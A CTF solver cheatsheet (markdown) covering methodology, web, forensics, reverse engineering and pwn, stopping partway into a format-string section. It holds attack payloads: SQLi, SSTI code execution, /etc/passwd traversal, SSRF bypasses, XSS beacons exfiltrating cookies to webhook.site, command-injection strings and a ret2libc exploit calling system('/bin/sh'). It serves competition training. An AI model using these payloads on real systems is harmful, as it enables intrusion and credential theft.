# CTF Solver Cheatsheet

This is a competition-oriented playbook for solving CTF challenges manually. It is shaped like an operator notebook: quick triage, repeatable enumeration, hypothesis testing, payloads, decoding habits, and safety rules. The goal is not to memorize every command. The goal is to learn how strong solvers reduce uncertainty.

## Table of Contents

- [Core Solver Model](#core-solver-model)
- [Local Labs and Remote Parity](#local-labs-and-remote-parity)
- [Notes, Time Management, and Stuck Recovery](#notes-time-management-and-stuck-recovery)
- [Universal Quick Reference](#universal-quick-reference)
- [Web](#web)
- [Forensics](#forensics)
- [Reverse Engineering](#reverse-engineering)
- [Pwn and Binary Exploitation](#pwn-and-binary-exploitation)
- [Crypto](#crypto)
- [OSINT](#osint)
- [Misc](#misc)
- [Final Competition Checklist](#final-competition-checklist)

---

## Core Solver Model

### Think Like a Solver

Strong CTF solving is controlled uncertainty reduction.

1. Observe exactly what is present.
2. Form one testable hypothesis.
3. Run the smallest command or input that can falsify it.
4. Record the evidence.
5. Escalate only when the simple explanation stops fitting.

Avoid jumping from "this has a login page" to "I need a full exploit chain." First prove a primitive: a route exists, a parameter reflects, a file can be read, a comparison leaks timing, a parser accepts malformed input, or a binary reaches a dangerous function.

### Hypothesis Loop

Use this loop for every category:

```text
Inventory -> Hypothesis -> Small test -> Evidence -> Refine -> Exploit or pivot
```

Good hypotheses:

| Weak thought | Strong hypothesis |
|---|---|
| "Maybe SQLi?" | "`id` is numeric, errors change with quotes, and responses differ on boolean predicates." |
| "Maybe hidden data?" | "`binwalk` shows appended ZIP data after a PNG IEND chunk." |
| "Maybe crypto?" | "The service signs `user=guest` with SHA256(secret||msg), so length extension may apply." |
| "Maybe pwn?" | "`checksec` shows no canary and a `gets()` call reaches a saved return address." |

### Fast Challenge Type Heuristics

| Signal | Likely Category | First Moves |
|---|---|---|
| URL, Docker web app, admin bot, cookies, API | Web | Capture normal requests, read JS/source, test authz and parsers |
| PCAP, disk image, memory dump, logs, Office/PDF/media | Forensics | `file`, hashes, metadata, timeline, extract artifacts read-only |
| Native binary asks for password or validates flag | Reverse | `file`, `strings`, `ltrace`, Ghidra/r2, identify transform |
| Remote `nc` with ELF/libc, overflow-like source | Pwn | `checksec`, find vuln, leak, control RIP/EIP, build exploit |
| Moduli, ciphertexts, signatures, RNG, elliptic curves | Crypto | Identify primitive, test bad parameters, write verification scripts |
| Real-world usernames, domains, images, coordinates | OSINT | Preserve clues, metadata, reverse search, DNS/WHOIS/archive |
| Jail, QR, audio, SDR, esolang, weird game, encoding chain | Misc | Identify format/rules, map constraints, automate the loop |

### Validation Ladder

Before escalating complexity, validate these in order:

1. Did I read the prompt and all files?
2. Did I identify file types and magic bytes?
3. Did I search for the flag format and common keywords?
4. Did I capture baseline behavior with normal input?
5. Did I change one variable at a time?
6. Did I verify locally and remotely are equivalent?
7. Did I prove the primitive before chaining?
8. Did I avoid using setup-only secrets or local-only shortcuts?

---

## Local Labs and Remote Parity

### Workspace Layout

Create a repeatable case directory:

```bash
mkdir -p work extracts logs scripts payloads notes
touch notes/found.md
find . -maxdepth 3 -type f -printf '%p\t%s bytes\n' | sort | tee notes/inventory.txt
find . -maxdepth 3 -type f -exec file -k {} \; | tee notes/filetypes.txt
find . -maxdepth 3 -type f -exec sha256sum {} \; | tee notes/hashes.txt
```

### Local Service Reproduction

Use Docker/source for analysis, not as a shortcut to the flag.

```bash
docker compose up --build
docker compose ps
curl -sI http://127.0.0.1:PORT/
nc -vz 127.0.0.1 PORT
```

Remote parity rules:

| Allowed | Avoid |
|---|---|
| Read source to find reachable bugs | Copying flags from source, `.env`, fixtures, or startup logs |
| Read Dockerfile for binary name, paths, architecture | Using hardcoded admin passwords from compose files |
| Connect through exposed HTTP/TCP service | `docker exec`, `docker cp`, `docker inspect` to bypass the challenge |
| Use local flag path to build ORW/read primitive | Reading the flag file directly from the build context |

Ask: "Would this exploit still work if the organizer rotated secrets and changed the seeded flag?" If no, it is recon, not a solve.

### Safe Handling

- Treat unknown executables, scripts, Office macros, shellcode, and malware-like files as suspicious.
- Prefer static analysis: `file`, `strings`, `xxd`, `objdump`, `r2`, Ghidra, `oletools`, `exiftool`.
- Do not detonate unknown payloads on your host.
- Use disposable containers/VMs when dynamic behavior is necessary.
- Keep pcap/disk/image work read-only unless writing into `work/`, `extracts/`, or `carved/`.
- Rate-limit brute force against shared infrastructure.
- Do not run destructive commands against remote services unless the challenge clearly expects it.

---

## Notes, Time Management, and Stuck Recovery

### Evidence-First Notes Template

````markdown
## Challenge: <name>

Prompt:
> exact prompt

Artifacts:
- file, size, sha256, type
- target URL/host/port

Known facts:
- Evidence-backed observations only

Hypotheses:
- [score/effort] hypothesis and why

Commands:
```bash
copyable commands
```

Results:
- decisive output snippets

Next:
- one next test, not ten guesses

Flag:
`flag{...}`
````

### Timeboxing

| Time | Action |
|---|---|
| 0-5 min | Read prompt, inventory files, identify type, search obvious strings |
| 5-15 min | Build baseline, enumerate surface, test likely primitives |
| 15-35 min | Commit to the best hypothesis and develop it |
| 35-45 min | If no primitive, pivot category or ask a teammate |
| 45+ min | Park unless you have a clear exploit path |

### Stuck Recovery

When stuck, do not add more tools immediately. Reduce ambiguity.

Checklist:

- Re-read the title, prompt, tags, and provided filenames.
- Explain the challenge in one sentence.
- List what would make each current hypothesis false.
- Run `file`, `strings`, metadata, and traffic/source inspection again.
- Compare local vs remote behavior.
- Try the smallest possible input: empty, one byte, long string, special chars.
- Look for decoys: fake flags, troll layers, misleading filenames, intentionally broken metadata.
- Switch perspective: "Where could the flag physically be stored?"
- Ask: "What input does the author expect me to control?"

---

## Universal Quick Reference

### Linux Search and Extraction

```bash
# Fast file and content search
rg --files
rg -n -i 'flag|ctf|secret|token|pass|key|admin|debug|todo'

# Binary strings with offsets
strings -a -n 6 artifact | nl -ba
strings -a -td artifact | rg -i 'flag|ctf|http|key|pass'

# Hex views
xxd -l 256 artifact
xxd artifact | rg -i '666c6167|637466|504b0304|89504e47'

# Find unusual files
find . -type f -printf '%p\t%s\n' | sort -k2 -n
find . -type f -exec file -k {} \;
find . -type f -exec sha256sum {} \;
```

### Regex and Text Processing

```bash
# Common flag formats
rg -a -o '([A-Za-z0-9_]+)?CTF\{[^}]{1,200}\}|flag\{[^}]{1,200}\}'

# URLs, IPs, emails, hashes
rg -a -o 'https?://[^"'"'"' <>()]+' .
rg -a -o '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' .
rg -a -o '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' .
rg -a -o '\b[a-fA-F0-9]{32}\b|\b[a-fA-F0-9]{40}\b|\b[a-fA-F0-9]{64}\b' .

# Print unique sorted tokens
rg -a -o '[A-Za-z0-9_./:-]{8,}' artifact | sort -u

# Extract JSON fields
jq .
jq -r '.. | strings? // empty' data.json
jq -r '.[] | [.id,.name,.role] | @tsv' data.json

# Useful sed/awk
sed -n '1,120p' file
awk -F, '{print NR,$1,$NF}' data.csv
awk '{count[$1]++} END {for (x in count) print count[x],x}' log | sort -nr
```

### Encoding and Decoding

```bash
# Base encodings
echo '68656c6c6f' | xxd -r -p
echo 'aGVsbG8=' | base64 -d
echo 'NBSWY3DP' | base32 -d
echo 'uryyb' | tr 'a-zA-Z' 'n-za-mN-ZA-M'

# URL decode
python3 - <<'PY'
import urllib.parse, sys
print(urllib.parse.unquote(sys.stdin.read().strip()))
PY

# All Caesar shifts
python3 - <<'PY'
s='Khoor Zruog'
for k in range(26):
    print(k, ''.join(chr((ord(c)-65-k)%26+65) if c.isupper() else chr((ord(c)-97-k)%26+97) if c.islower() else c for c in s))
PY
```

CyberChef recipes to try:

| Symptom | Recipe |
|---|---|
| `%7B%22x%22%3A...` | URL Decode -> JSON Beautify |
| `1f8b08...` | From Hex -> Gunzip |
| Repeating readable bytes after XOR | XOR Brute Force or XOR with known plaintext `flag{` |
| CJK-looking mojibake | Encode UTF-16BE -> Decode UTF-16LE, or reverse |
| Layered text | Magic, but verify each step manually |
| JWT | From Base64URL each segment -> JSON Beautify |

### Magic Bytes and Protocol Hints

| Bytes / Text | Meaning |
|---|---|
| `89 50 4e 47 0d 0a 1a 0a` | PNG |
| `ff d8 ff` | JPEG |
| `47 49 46 38` | GIF |
| `25 50 44 46` | PDF |
| `50 4b 03 04` | ZIP, DOCX, XLSX, JAR, APK |
| `1f 8b 08` | gzip |
| `42 5a 68` | bzip2 |
| `fd 37 7a 58 5a 00` | xz |
| `7f 45 4c 46` | ELF |
| `4d 5a` | Windows PE |
| `ca fe ba be` | Java class or Mach-O fat |
| `d0 cf 11 e0` | OLE Compound File, old Office |
| `52 61 72 21` | RAR |
| `37 7a bc af 27 1c` | 7z |
| `pcap`, `pcapng` | Network capture |
| `SQLite format 3` | SQLite database |
| `RIFF....WAVE` | WAV |

---

## Web

### Core Methodology

Web challenges are trust-boundary puzzles. Map where user input crosses into a parser, database, template engine, file system, browser, internal network, or privileged bot.

Start with normal use before fuzzing. Capture one clean request/response for each feature. Then mutate one field at a time and compare status code, length, headers, timing, redirects, and side effects.

### Quick Type Heuristics

| Clue | Likely Bug Family |
|---|---|
| Login, roles, object IDs | Auth bypass, IDOR, JWT/session forgery |
| Search/filter/sort | SQLi, NoSQLi, LDAPi, template injection |
| Upload/export/PDF/image processing | File upload, parser abuse, SSRF, LFI, RCE |
| Report URL/admin bot | XSS, CSRF, CSP bypass, browser-only flag |
| Webhook/fetch URL | SSRF, DNS rebinding, redirect/parser mismatch |
| XML/SOAP/SVG/DOCX | XXE, XML injection |
| Node app, JSON merge, `constructor` | Prototype pollution |
| GraphQL endpoint | Introspection, batching, authz gaps |

### Enumeration Workflow

1. Fingerprint:

```bash
curl -sI "$URL"
curl -sk "$URL" | tee work/index.html
whatweb "$URL" 2>/dev/null || true
```

2. Read public metadata:

```bash
for p in robots.txt sitemap.xml .well-known/security.txt .git/HEAD; do
  echo "== $p =="; curl -sk "$URL/$p"; echo
done
```

3. Pull JavaScript and route hints:

```bash
curl -sk "$URL" \
  | rg -o 'src="[^"]+|href="[^"]+' \
  | sed 's/^[^"]*"//' | sort -u

rg -a -o '/[A-Za-z0-9_./{}:-]+' work/*.js | sort -u
rg -a -i 'api|admin|debug|token|secret|flag|graphql|upload|callback' work
```

4. Fuzz paths and methods:

```bash
ffuf -u "$URL/FUZZ" -w wordlist.txt -mc all -fs 0
for m in GET POST PUT PATCH DELETE OPTIONS TRACE; do
  curl -sk -X "$m" -i "$URL/api/thing" | sed -n '1,20p'
done
```

5. Test content-type confusion:

```bash
curl -sk -i "$URL/api/login" -H 'Content-Type: application/json' -d '{"user":"guest"}'
curl -sk -i "$URL/api/login" -H 'Content-Type: application/x-www-form-urlencoded' -d 'user=guest'
curl -sk -i "$URL/api/login" -H 'Content-Type: application/xml' -d '<user>guest</user>'
```

6. Build the primitive:

```text
Reflects input? -> XSS/SSTI/filter bypass
Reads URL? -> SSRF/internal pivot
Reads path? -> LFI/traversal/wrapper
Stores data then later renders it? -> stored XSS/second-order injection
Accepts IDs? -> IDOR/authz
Accepts structured objects? -> mass assignment/prototype pollution
```

### Common Attack Patterns

| Pattern | First Payloads | What Success Looks Like |
|---|---|---|
| SQLi | `'`, `"`, `1 OR 1=1--`, `' UNION SELECT NULL--` | Error, boolean difference, timing, row count change |
| Blind SQLi | `' AND substr((select flag),1,1)='f'--` | Response/timing oracle |
| NoSQLi | `{"$ne":null}`, `{"$regex":"^a"}` | Login bypass or regex oracle |
| SSTI | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | `49`, error naming template engine |
| LFI | `../../../../etc/passwd`, `....//....//etc/passwd` | File contents, path errors |
| PHP wrappers | `php://filter/convert.base64-encode/resource=index.php` | Base64 source leak |
| SSRF | `http://127.0.0.1:80/`, `http://[::1]/`, `file:///etc/passwd` | Internal response, callback, timing |
| XXE | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | File contents or OOB hit |
| Command injection | `;id`, `|id`, `` `id` ``, `$(id)`, `%0aid` | Output or timing |
| XSS | `<script>fetch('//x/'+document.cookie)</script>` | Bot callback or privileged action |
| JWT | `alg:none`, weak secret, key confusion | Forged admin token accepted |
| Prototype pollution | `{"__proto__":{"admin":true}}` | New inherited property changes behavior |
| GraphQL | `{__schema{types{name}}}` | Schema leak or hidden resolver |

### Payload Examples

SQLi:

```text
' OR '1'='1'--
' UNION SELECT NULL,NULL,NULL--
' AND (SELECT CASE WHEN (substr(flag,1,1)='f') THEN 1 ELSE 1/0 END)--
'; SELECT pg_sleep(5)--
```

SSTI:

```text
{{7*7}}
{{config}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
${T(java.lang.Runtime).getRuntime().exec('id')}
```

Traversal and wrappers:

```text
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
php://filter/convert.base64-encode/resource=index.php
file:///etc/passwd
```

SSRF parser tricks:

```text
http://127.0.0.1/
http://localhost/
http://[::1]/
http://2130706433/
http://0177.0.0.1/
http://127.1/
http://evil.com@127.0.0.1/
http://127.0.0.1.evil.test/
```

XSS beacons:

```html
<img src=x onerror="new Image().src='https://webhook.site/ID?c='+encodeURIComponent(document.cookie)">
<script>fetch('/admin').then(r=>r.text()).then(t=>navigator.sendBeacon('https://webhook.site/ID',t))</script>
```

JWT:

```bash
TOKEN='a.b.c'
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
flask-unsign --decode --cookie "$COOKIE"
flask-unsign --unsign --cookie "$COOKIE" --wordlist rockyou.txt
```

### Tools and When to Use Them

| Tool | Use |
|---|---|
| Browser DevTools | Understand UI state, storage, API calls |
| Burp Suite / Caido | Repeater, request history, auth state, diffs |
| `curl` | Exact reproducible HTTP transcripts |
| `ffuf` | Route, parameter, vhost fuzzing |
| `jq` | JSON response inspection and extraction |
| `sqlmap` | Confirm/extract after manual SQLi evidence |
| `flask-unsign`, `jwt_tool` | Session/JWT analysis |
| `webhook.site` | One-shot bot callbacks and blind exfil |
| Static hosting | Admin bot pages that need JS execution |

### Misconfigurations and Artifacts

- Source maps: `app.js.map`
- `.git/`, backups: `.bak`, `~`, `.swp`, `.old`, `.zip`
- Debug routes: `/debug`, `/actuator`, `/metrics`, `/console`
- CORS: `Access-Control-Allow-Origin: *` with credentials
- Proxy trust: `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`
- Alternate methods: `PUT`, `PATCH`, `DELETE`, `OPTIONS`
- Hidden JSON fields: `role`, `isAdmin`, `price`, `verified`, `ownerId`
- Different parsers: proxy vs app URL parsing, sanitizer vs browser, XML parser vs business logic

### Manual Before Automation

- Read HTML and JS before directory brute forcing.
- Make a table of endpoints, methods, parameters, auth required, and response shape.
- For every suspicious parameter, test reflection, quote behavior, path separators, JSON objects, arrays, nulls, and overlong values.
- Compare guest/user/admin authorization by changing only IDs and object references.
- For bot challenges, first prove the bot visits your URL, then prove script execution, then exfiltrate or perform a privileged action.

### Rabbit Holes

- Treating Docker secrets or seeded admin credentials as the solve.
- Running `sqlmap` before understanding login/session flow.
- Ignoring bundled JS and source maps.
- Missing second-order behavior: stored data later rendered by admin/export/worker.
- Assuming localhost filters are robust.
- Testing only GET when the backend accepts JSON POST.
- Overbuilding an exploit before proving the primitive.

### Web Decision Flow

```text
Can I reach a hidden privileged state?
  Yes -> Is it authz, token/session, or IDOR?
  No -> Does input hit a parser?
        DB -> SQLi/NoSQLi
        Template -> SSTI
        Path -> LFI/traversal
        URL fetcher -> SSRF
        Browser/admin bot -> XSS/CSRF
        File processor -> upload/polyglot/parser abuse
```

### Mental Checklist

- Did I capture baseline requests?
- Did I inspect JS, cookies, localStorage, and source maps?
- Did I test methods and content types?
- Did I check authz by changing IDs?
- Did I identify where the flag lives: file, DB, admin page, browser, internal service?
- Does my final chain work through the exposed service only?

---

## Forensics

### Core Methodology

Forensics is evidence reconstruction. Do not guess the story. Inventory artifacts, preserve hashes, extract metadata, correlate timestamps, and keep derived files separate.

The best first question is: "What artifact could physically contain the flag or the evidence needed to derive it?"

### Enumeration Workflow

```bash
pwd
find . -maxdepth 3 -type f -printf '%p\t%s bytes\n' | sort
find . -maxdepth 3 -type f -exec file -k {} \;
find . -maxdepth 3 -type f -exec sha256sum {} \;
mkdir -p work extracts carved logs
```

Then pivot by artifact:

| Artifact | First Commands |
|---|---|
| Archive | `7z l file`, `binwalk file`, `strings -a -n 6 file` |
| Image/media | `exiftool`, `identify -verbose`, `binwalk`, `zsteg`, `stegsolve`, spectrogram |
| PCAP | `capinfos`, `tshark -r`, protocol hierarchy, streams, exported objects |
| Disk image | `mmls`, `fsstat`, `fls -r`, `icat`, `tsk_recover` |
| Memory dump | `vol3 -f dump windows.info`, `pslist`, `netscan`, `filescan`, `dumpfiles` |
| Browser profile | SQLite history/downloads/cookies/local storage |
| Windows logs | EVTX, registry hives, Prefetch, Amcache, LNK, Jump Lists |
| Linux logs | auth logs, shell history, cron, systemd, SSH, containers |
| Suspicious binary/script | Static strings, imports, resources, decompile, never execute blindly |

### Common Patterns

| Pattern | Indicators | Technique |
|---|---|---|
| Appended data | Valid image plus extra bytes after EOF | `binwalk`, `foremost`, manual carve with offsets |
| Wrong extension | `file` disagrees with name | Rename or parse by magic |
| Nested archives | Repeated compression signatures | Recursive extraction, password search |
| Metadata flag | EXIF/PDF/comment fields | `exiftool`, `pdfinfo`, `strings` |
| Stego LSB | Image looks normal, huge dimensions/noise | `zsteg`, bit planes, channel extraction |
| PCAP credential leak | HTTP/FTP/SMTP/IRC/DNS | `tshark`, follow streams, export objects |
| DNS exfil | Many long TXT/subdomain queries | Extract labels, base decode |
| USB HID | `usb.capdata`, 8-byte reports | Keyboard/mouse reconstruction |
| Memory flag | Process command line, env, dumped file | Volatility filescan/dumpfiles/yarascan |
| Deleted file | Disk image with filesystem | Sleuth Kit, timeline, recover |

### Useful Commands

General:

```bash
file -k artifact
exiftool artifact
binwalk -e artifact
foremost -i artifact -o carved/
strings -a -n 6 artifact | rg -i 'flag|ctf|secret|password|http|key'
xxd -l 256 artifact
```

PCAP:

```bash
capinfos capture.pcap
tshark -r capture.pcap -q -z io,phs
tshark -r capture.pcap -Y 'http.request' -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
tshark -r capture.pcap -Y 'dns.qry.name' -T fields -e frame.time_epoch -e ip.src -e dns.qry.name
tshark -r capture.pcap -q -z follow,tcp,ascii,0
tshark -r capture.pcap --export-objects http,extracts/
```

Disk:

```bash
mmls image.dd
fsstat -o OFFSET image.dd
fls -o OFFSET -r image.dd | tee work/fls.txt
icat -o OFFSET image.dd INODE > extracts/file.bin
tsk_recover -o OFFSET image.dd extracts/recovered
```

Memory:

```bash
vol3 -f memory.dmp windows.info
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.pstree
vol3 -f memory.dmp windows.cmdline
vol3 -f memory.dmp windows.netscan
vol3 -f memory.dmp windows.filescan | rg -i 'flag|secret|\.txt|\.zip'
vol3 -f memory.dmp windows.yarascan --yara-string 'flag{'
```

Browser:

```bash
sqlite3 History "select datetime(last_visit_time/1000000-11644473600,'unixepoch'),url,title from urls order by last_visit_time desc limit 30;"
sqlite3 Cookies "select host_key,name,value,datetime(expires_utc/1000000-11644473600,'unixepoch') from cookies limit 20;"
```

### Decoding Tricks

DNS exfil:

```bash
tshark -r dns.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name \
  | sed 's/\.example\.com$//' | tr -d '\n' | base64 -d
```

HTTP object carving:

```bash
tshark -r traffic.pcap --export-objects http,extracts
find extracts -type f -exec file {} \;
```

Post-EOF carving:

```bash
xxd image.png | rg '49454e44ae426082'  # PNG IEND
binwalk image.png
dd if=image.png of=extracts/extra.bin bs=1 skip=OFFSET status=none
```

Image LSB:

```bash
zsteg image.png
zsteg -a image.png | rg -i 'flag|ctf'
```

Spectrogram:

```bash
sox audio.wav -n spectrogram -o work/spec.png
ffmpeg -i video.mp4 -vf fps=1 extracts/frame_%04d.png
```

### Manual Before Automation

- Look at the artifact visually and structurally before bulk carving.
- Compare file extension, magic bytes, and metadata.
- Preserve original files and write all outputs elsewhere.
- Build a mini timeline when multiple logs/artifacts exist.
- For PCAPs, inspect protocol hierarchy before following random streams.
- For memory, identify OS/profile and suspicious processes before dumping everything.
- For scripts/binaries, extract constants and decode routines statically before executing anything.

### Rabbit Holes

- Carving everything before reading metadata.
- Ignoring timestamps and usernames.
- Treating every high-entropy blob as encrypted instead of compressed.
- Executing suspicious files.
- Forgetting Office files are ZIPs.
- Missing small side channels: comments, thumbnails, alternate data streams, browser local storage.
- Overlooking split data across DNS labels, TCP streams, or image frames.

### Forensics Decision Flow

```text
What kind of artifact is it?
  Container/archive -> list, extract, recurse
  File with extra data -> magic/EOF offsets, carve
  Network -> protocol stats, streams, objects, DNS labels
  Disk -> partitions, filesystem, deleted files, timeline
  Memory -> OS profile, processes, network, files, strings/YARA
  Media -> metadata, bit planes, spectrogram, frames
```

### Mental Checklist

- Did I hash and identify every provided file?
- Did I check metadata, strings, and magic bytes?
- Did I preserve original evidence?
- Did I correlate timestamps, paths, users, and network endpoints?
- Did I prove every extraction step is reproducible?
- Did I avoid executing suspicious code?

---

## Reverse Engineering

### Core Methodology

Reverse engineering challenges usually hide a validation algorithm. Your job is to recover the relation between input and success, not necessarily to understand the whole program.

Prefer the shortest path to the check:

1. Search for plaintext.
2. Observe runtime calls.
3. Locate comparisons and success/failure branches.
4. Recover transforms.
5. Write a solver or patch the branch.

### Enumeration Workflow

```bash
file binary
sha256sum binary
checksec --file=binary 2>/dev/null || true
strings -a -n 5 binary | rg -i 'flag|ctf|correct|wrong|password|usage|secret'
rabin2 -z binary 2>/dev/null | rg -i 'flag|correct|wrong'
readelf -h binary
readelf -s binary | head
```

Dynamic quick wins:

```bash
chmod +x ./binary
./binary
echo 'AAAA' | ./binary
ltrace ./binary 2>&1 | tee logs/ltrace.txt
strace -f -s 500 ./binary 2>&1 | tee logs/strace.txt
```

GDB:

```bash
gdb -q ./binary
start
info functions
disassemble main
b strcmp
b memcmp
run
```

### Common Patterns

| Pattern | Indicator | Approach |
|---|---|---|
| Plain compare | `strcmp`, `memcmp`, success string | Break on compare, inspect arguments |
| Byte-wise transform | Loops over input bytes | Reimplement inverse in Python |
| XOR/repeating key | Constants, `xor`, known `flag{` | Known plaintext or brute key |
| Position-dependent check | `input[i] ^ i`, sums | Solve per byte or with Z3 |
| Table/S-box | Large byte arrays | Extract table, invert if bijective |
| Packed binary | UPX markers, few strings | `upx -d`, dump memory, entropy check |
| Anti-debug | `ptrace`, `/proc`, timing | Patch, LD_PRELOAD, Frida, static |
| Custom VM | Dispatch loop, bytecode array | Write disassembler/emulator |
| Python bytecode | `.pyc`, marshal | `uncompyle6`, `pycdc`, `dis` |
| WASM/APK/.NET | Platform-specific container | Use decompiler for the platform |

### Runtime Comparison Dumping

Let the program calculate the expected value, then inspect it.

```gdb
b strcmp
b memcmp
run
x/s $rdi
x/s $rsi
x/32bx $rdi
x/32bx $rsi
```

For PIE:

```gdb
start
p/x &main
b *main+0xca
```

### Hooking and Side Channels

Frida-style idea: hook `strcmp`, `memcmp`, `strncmp`, or custom validation functions and print arguments.

```bash
ltrace -s 500 ./binary
strace -f -s 500 ./binary
```

Instruction-count side channel:

```text
If longer correct prefixes run longer, brute force one character at a time.
Use timing, branch counts, or debugger breakpoints as the oracle.
```

### Solver Snippets

XOR brute:

```python
data = bytes.fromhex("2d0b0f...")
for k in range(256):
    out = bytes(b ^ k for b in data)
    if b"flag{" in out or b"CTF{" in out:
        print(k, out)
```

Known plaintext repeating XOR:

```python
ct = bytes.fromhex("...")
known = b"flag{"
print(bytes(ct[i] ^ known[i] for i in range(len(known))))
```

Z3 byte constraints:

```python
from z3 import *
n = 32
flag = [BitVec(f'f{i}', 8) for i in range(n)]
s = Solver()
for c in flag:
    s.add(c >= 0x20, c <= 0x7e)
s.add(flag[0] == ord('f'), flag[1] == ord('l'), flag[2] == ord('a'), flag[3] == ord('g'), flag[4] == ord('{'))
# Add recovered constraints here
print(s.check())
m = s.model()
print(bytes([m[c].as_long() for c in flag]))
```

Patch a branch:

```bash
# In radare2
r2 -w ./binary
aaa
pdf @ main
# Replace conditional jump with NOPs or flip jz/jnz after confirming address
```

### Tools and When to Use Them

| Tool | Use |
|---|---|
| `strings`, `rabin2`, `readelf`, `objdump` | Fast static triage |
| `ltrace`, `strace` | Library/syscall behavior and hidden comparisons |
| GDB + pwndbg/GEF | Runtime values, breakpoints, patching |
| Ghidra/IDA/Binary Ninja | Decompile and understand validation logic |
| radare2/Cutter | Fast CLI analysis and patching |
| Frida | Hook functions, bypass checks, inspect runtime |
| angr | Symbolic execution for path-to-success binaries |
| Qiling/Unicorn | Emulate foreign arch or isolated routines |
| pycdc/uncompyle6/dis | Python bytecode |
| apktool/jadx | Android APK |
| dnSpy/ILSpy | .NET |
| wasm2wat/wat2wasm | WASM inspection and patching |

### Manual Before Automation

- Identify architecture, format, and whether it is stripped.
- Search for success/failure strings and cross-references.
- Find input-reading functions and validation calls.
- Determine comparison direction: `transform(input) == target` vs `transform(target) == input`.
- Extract constants exactly, including endian order.
- Solve a reduced sample by hand before writing a solver.

### Rabbit Holes

- Reversing every function instead of following input to decision.
- Trusting one decompiler output without checking assembly.
- Missing decoy flags and earlier fake comparisons.
- Forgetting signedness and integer width.
- Assuming encryption when it is a simple transform.
- Fighting anti-debug dynamically when a one-byte patch or static extraction is enough.

### Reverse Decision Flow

```text
Can strings/ltrace reveal the answer?
  Yes -> validate and submit
  No -> Find input and final branch
        Direct compare -> dump args or invert transform
        Many constraints -> Z3/angr
        VM/bytecode -> disassemble VM instructions
        Packed/anti-debug -> unpack/patch/bypass
```

### Mental Checklist

- Did I check strings and library calls?
- Did I identify where input is read?
- Did I locate success and failure branches?
- Did I know which side of the comparison is transformed?
- Did I extract constants with correct endian and width?
- Did I write a verifier for my recovered flag?

---

## Pwn and Binary Exploitation

### Core Methodology

Pwn is primitive engineering. First understand the bug, then turn it into control.

Typical chain:

```text
Bug -> crash/control offset -> leak -> calculate base -> write/control RIP -> code execution or ORW -> flag
```

Do not begin with ROP. Begin with:

- What memory corruption or logic flaw exists?
- What protections are enabled?
- What can I leak?
- What can I overwrite?
- What is the simplest win condition?

### Enumeration Workflow

```bash
file vuln
checksec --file=vuln
readelf -h vuln
readelf -s vuln | rg 'win|system|puts|read|write|printf'
strings -a -n 5 vuln | rg -i 'flag|sh|bin|win|puts|printf|scanf|gets'
ldd ./vuln 2>/dev/null || true
```

Crash and offset:

```bash
python3 - <<'PY'
from pwn import *
print(cyclic(300).decode())
PY
gdb -q ./vuln
# run, crash, inspect RIP/EIP, then:
python3 - <<'PY'
from pwn import *
print(cyclic_find(0x61616168))
PY
```

Gadgets:

```bash
ROPgadget --binary vuln | rg 'pop rdi|pop rsi|pop rdx|syscall|ret'
ropper -f vuln --search 'pop rdi; ret'
one_gadget ./libc.so.6 2>/dev/null
```

### Protection Strategy

| Protection | Meaning | Strategy |
|---|---|---|
| No PIE | Binary addresses fixed | ret2win, fixed GOT/PLT, simple ROP |
| PIE | Binary base randomized | Leak binary address or use relative info |
| NX enabled | Stack not executable | ROP, ret2libc, SROP, ORW |
| NX disabled | Stack shellcode possible | Inject shellcode if input permits |
| Canary | Stack overwrite detected | Leak canary, partial overwrite, non-stack bug |
| Partial RELRO | GOT writable | GOT overwrite possible |
| Full RELRO | GOT read-only | Hooks, return addresses, heap targets, FSOP |
| Seccomp | Syscalls filtered | ORW allowed syscalls, SROP, x32 tricks, logic bypass |

### Common Vulnerabilities

| Bug | Clues | Primitive |
|---|---|---|
| Stack overflow | `gets`, `scanf("%s")`, unchecked `read` | RIP control |
| Format string | `printf(user)` | Leak, arbitrary write with `%n` |
| UAF | menu create/free/show/edit | Heap leak, tcache poisoning |
| Double free | free same index twice | Tcache/fastbin poisoning |
| Off-by-one/null | one byte overwrite | Chunk consolidation, saved size corruption |
| Integer overflow | signed/unsigned mismatch | OOB read/write or bypass |
| Race/TOCTOU | threads, sleeps, globals | Win race, double action |
| Type confusion | variant objects, function ptr arrays | Pointer hijack |
| Sandbox | seccomp, custom VM, restricted shell | Escape or allowed syscall chain |

### Pwntools Template

```python
from pwn import *

context.binary = elf = ELF('./vuln')
context.log_level = 'info'

HOST, PORT = 'host', 31337

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

io = start()

offset =  cyclic_find(0x61616168)  # replace
rop = ROP(elf)

payload = flat(
    b'A' * offset,
    rop.find_gadget(['ret'])[0],
    elf.sym['win'],
)

io.sendlineafter(b'> ', payload)
io.interactive()
```

### Ret2libc Pattern

```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop = ROP(elf)
io = remote('host', 31337)

offset = 72
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = flat(
    b'A' * offset,
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main'],
)
io.sendlineafter(b'> ', payload)
leak = u64(io.recvline().strip().ljust(8, b'\0'))
libc.address = leak - libc.sym['puts']
log.info(hex(libc.address))

payload = flat(
    b'A' * offset,
    ret,
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.sym['system'],
)
io.sendlineafter(b'> ', payload)
io.interactive()
```

### ORW Chain Idea

If shell is blocked or seccomp allows only file syscalls:

```text
open("/flag", O_RDONLY) -> read(fd, buf, size) -> write(1, buf, size)
```

Tip: after `open`, use returned `rax` as the file descriptor instead of hardcoding `3`; Docker/socat file descriptors may differ.

### Format String Quick Reference

```bash
# Find stack offsets
python3 - <<'PY'
